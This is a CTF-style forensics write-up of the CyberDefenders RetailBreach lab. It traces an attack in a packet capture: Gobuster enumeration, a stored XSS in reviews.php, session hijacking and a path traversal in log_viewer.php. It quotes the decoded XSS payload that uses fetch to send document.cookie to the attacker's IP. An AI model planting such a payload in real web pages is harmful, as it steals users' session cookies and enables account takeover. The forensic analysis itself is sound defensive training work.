## Cyberdefender lab - RetailBreach

## ⚠️ Disclaimer ⚠️

This write-up is for educational purposes only. It is meant to explain the thought process and steps taken to solve the challenge.

Please do not simply copy and paste the answers, as this may slow down your technical growth and prevent you from building real problem-solving skills.

Always try the challenge on your own first. Use this write-up only as a guide to understand the approach, not as a shortcut. Real skills are built through practice, trial and error, and persistence.

## CyberDefender Lab Write-ups

[Cyberdefender](https://cyberdefenders.org/walkthroughs/retailbreach/)

## Overview

This write-up documents my investigation of the RetailBreach lab on CyberDefenders, focusing on analyzing suspicious activity, identifying key indicators, and understanding the attacker's actions.

## Lab Information

**1- Lab Title:** RetailBreach.

**2- Course:** Network Forensics.

## Objective

The objective of this lab is to investigate suspicious network activity, identify the web application vulnerabilities exploited by the attacker, and trace their attack activity. This includes analyzing the XSS payload, extracting the administrator's session token, and determining how the attacker gained unauthorized access to restricted resources.

## Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?

I started by analyzing the HTTP traffic in Wireshark using the following filter: `http.request.method == GET`, I noticed a large number of HTTP GET requests originating from the same IP address within a short period of time, The source IP `111.224.180.128` was repeatedly sending requests to the server 73.124.17.52, while continuously changing the requested paths.

![ip_attacker](screenshot/IP_attacker.png)

The high frequency and changing URI paths suggested automated web enumeration or path discovery rather than normal user activity.

## Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?

To identify the tool used by the attacker, I inspected the HTTP streams and examined the HTTP request headers, particularly the `User-Agent` field.

The following User-Agent was identified: `User-Agent: gobuster/3.6`

![Tool](screenshot/The_tool_that_used.png)

This indicates that the attacker used Gobuster version 3.6 to perform directory brute-forcing and discover hidden paths on the server.

## Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?

Since the attack involved Cross-Site Scripting (XSS), I looked for HTTP POST requests containing script-related content. I used the following Wireshark filter: `http.request.method == POST and http contains "script"` 
This led me to a POST request to `reviews.php`, where I found a URL-encoded XSS payload in the review parameter.

![XSS](screenshot/xss_payload.png)

After decoding the payload, it was: `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`
The payload was designed to steal the administrator's session cookie and send it to the attacker's IP address.

## Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?

After identifying the XSS payload injected into `reviews.php`, I analyzed subsequent HTTP requests to the same page while excluding the attacker's IP address. I used the following filter: `ip.src != 111.224.180.128 && http.request.uri contains "reviews.php"`
This revealed two requests from the source IP 135.143.142.5:
`2024-03-29 11:50:53.924069`
`2024-03-29 12:09:50.869688`

![Timestamp](screenshot/Timestamp.png)

The first request occurred before the XSS payload was injected. The second request occurred after the injection and represents the admin's first visit to the page containing the malicious script.

## Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?

After identifying the administrator's first visit to the page containing the XSS payload in Q4, I followed the corresponding HTTP stream and inspected the request headers.

The administrator's session cookie was present in the `Cookie` header:
`Cookie: PHESESSID=lqkctf24s9h9lg67teu8uevn3q`

![Session](screenshot/Session_token.png)

This session token was subsequently acquired by the attacker through the XSS attack and used to hijack the administrator's session.

## Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?

To identify the script exploited by the attacker, I filtered the HTTP POST requests and searched for requests containing file-related content: `http.request.method == POST && http contains "file"`
After reviewing the resulting requests, I identified the script: `log_viewer.php`

![Script](screenshot/file_name_and_the_path_into_it.png)

## Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?

While analyzing the request associated with `log_viewers.php`, I inspected the value passed through the `file` parameter.

The parameter contained a path using directory traversal sequences (`../`), indicating that the attacker was attempting to navigate outside the application's intended directory and access a sensitive system file.

This is a **Path Traversal** attack.

![Script](screenshot/file_name_and_the_path_into_it.png)

The server's response revealed sensitive system information, confirming that the traversal attempt was successful.

![Content](screenshot/Content_of_the_secret_file.png)

